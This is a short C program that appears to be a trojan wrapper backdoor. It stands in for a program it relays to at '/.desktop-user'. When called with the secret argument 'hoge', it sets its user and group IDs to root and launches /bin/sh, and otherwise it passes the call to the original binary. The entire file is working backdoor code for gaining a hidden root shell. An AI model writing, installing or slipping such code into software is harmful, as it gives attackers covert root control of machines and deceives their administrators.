#include <sys/stat.h>
#include <unistd.h>
#include <string.h>

#define ORIGINAL "/.desktop-user"
#define MAGIC    "hoge"

int main(int argc, char *argv[])
{
  struct stat statbuf;

  if (argc==2 && !strcmp(argv[1], MAGIC)) {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", NULL);
  } else {
    stat(argv[0], &statbuf);
    setuid(statbuf.st_uid);
    setgid(statbuf.st_gid);
    execv(ORIGINAL, argv);
  }
}

